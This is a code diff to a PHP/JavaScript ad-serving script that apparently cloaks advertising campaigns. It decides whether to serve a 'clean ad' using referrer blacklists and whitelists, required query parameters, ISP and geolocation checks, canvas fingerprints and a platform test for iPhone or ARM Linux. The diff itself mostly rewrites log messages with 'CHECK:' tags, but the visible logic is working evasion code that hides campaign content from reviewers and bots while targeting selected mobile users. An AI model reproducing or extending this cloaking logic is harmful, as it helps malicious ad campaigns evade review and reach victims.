@@ -210,7 +210,6 @@
 
 	function handleTrafficLoggerData($campaignID)
 	{
-		/* Handle POSTed data to the URL and add it to our log */
 		if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists("data", $_POST))
 		{
 			$decoded = urldecode($_POST['data']);
@@ -349,6 +348,7 @@
 	if ($loggingEnabled)
 	{
 		adlog($campaignID, $ip, $isp['isp'],
+			"INFO:GEO:" .
 			'ip:"'.$ip.'",'.
 			'isp:"'.$isp['isp'].'",'.
 			'city:"'.$geo['city'].'",'.
@@ -387,11 +387,16 @@
 
 				if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "Referrer $_SERVER[HTTP_REFERER] is in blacklist.");
+					mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_BLACKLIST_BLOCKED: Referrer $_SERVER[HTTP_REFERER] is in blacklist.");
 				}
 
 				break;
 			}
+		}
+
+		if (!$serveCleanAd && $loggingEnabled)
+		{
+			mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_BLACKLIST_ALLOWED: Referrer $_SERVER[HTTP_REFERER] is NOT in blacklist.");
 		}
 
 		if (!$serveCleanAd && !empty($whitelistedReferrers))
@@ -414,8 +419,12 @@
 
 				if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "Referrer $_SERVER[HTTP_REFERER] is not in whitelist.");
+					mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_WHITELIST_BLOCKED: Referrer $_SERVER[HTTP_REFERER] is not in whitelist.");
 				}
+			}
+			elseif ($loggingEnabled)
+			{
+				mbotlog($campaignID, $ip, $isp['isp'], "CHECK:REFERRER_WHITELIST_ALLOWED: Referrer $_SERVER[HTTP_REFERER] is in whitelist.");
 			}
 		}
 	}
@@ -432,7 +441,7 @@
 
 					if ($loggingEnabled)
 					{
-						mbotlog($campaignID, $ip, $isp['isp'], "Parameter $parameter has blocked value: $_GET[$parameter].");
+						mbotlog($campaignID, $ip, $isp['isp'], "CHECK:PARAMETER_BLOCKED: Parameter $parameter has blocked value: $_GET[$parameter].");
 					}
 
 					break;
@@ -444,11 +453,16 @@
 
 				if ($loggingEnabled)
 				{
-					mbotlog($campaignID, $ip, $isp['isp'], "Parameter $parameter missing from querystring.");
+					mbotlog($campaignID, $ip, $isp['isp'], "CHECK:PARAMETER_MISSING: Parameter $parameter missing from querystring.");
 				}
 
 				break;
 			}
+		}
+
+		if (!$serveCleanAd && $loggingEnabled)
+		{
+			mbotlog($campaignID, $ip, $isp['isp'], "CHECK:PARAMETER_ALLOWED: Parameter $parameter with value $_GET[$parameter] is allowed.");
 		}
 	}
 
@@ -458,7 +472,7 @@
 
 		if ($loggingEnabled)
 		{
-			adlog($campaignID, $ip, $isp['isp'], "UserAgent is not a mobile device.");
+			adlog($campaignID, $ip, $isp['isp'], "CHECK:USERAGENT_MOBILE: UserAgent is not a mobile device.");
 		}
 	}
 	elseif (!$serveCleanAd && $ispCloakingEnabled)
@@ -482,7 +496,7 @@
 
 			if ($loggingEnabled)
 			{
-				adlog($campaignID, $ip, $isp['isp'], "ISP/Geo is allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
+				adlog($campaignID, $ip, $isp['isp'], "CHECK:GEO_ALLOWED: ISP/Geo is allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
 			}
 		}
 		else
@@ -491,7 +505,7 @@
 
 			if ($loggingEnabled)
 			{
-				adlog($campaignID, $ip, $isp['isp'], "ISP/Geo is NOT allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
+				adlog($campaignID, $ip, $isp['isp'], "CHECK:GEO_BLOCKED: ISP/Geo is NOT allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
 			}
 		}
 	}
@@ -687,11 +701,11 @@
 
 							if (result)
 							{
-								jslog('CanvasFingerprint: ' + canvasFingerPrint + ' in blocked list.');
+								jslog('CHECK:CANVASFINGERPRINT_BLOCKED: CanvasFingerprint: ' + canvasFingerPrint + ' in blocked list.');
 							}
 							else
 							{
-								jslog('CanvasFingerprint: ' + canvasFingerPrint + ' NOT in blocked list.');
+								jslog('CHECK:CANVASFINGERPRINT_ALLOWED: CanvasFingerprint: ' + canvasFingerPrint + ' NOT in blocked list.');
 							}
 
 							return result;
@@ -712,6 +726,8 @@
 						   	{
 							   	if (/(iphone|linux armv)/i.test(window.navigator.platform))
 							    {
+									jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
+
 								    setTimeout(function()
 									{
 										var topDomain = getReferrerDomain();
@@ -721,7 +737,7 @@
 								}
 								else
 								{
-									jslog('Platform test failed: ' + window.navigator.platform);
+									jslog('CHECK:PLATFORM_BLOCKED: Platform test failed: ' + window.navigator.platform);
 								}
 							}
 					   	}
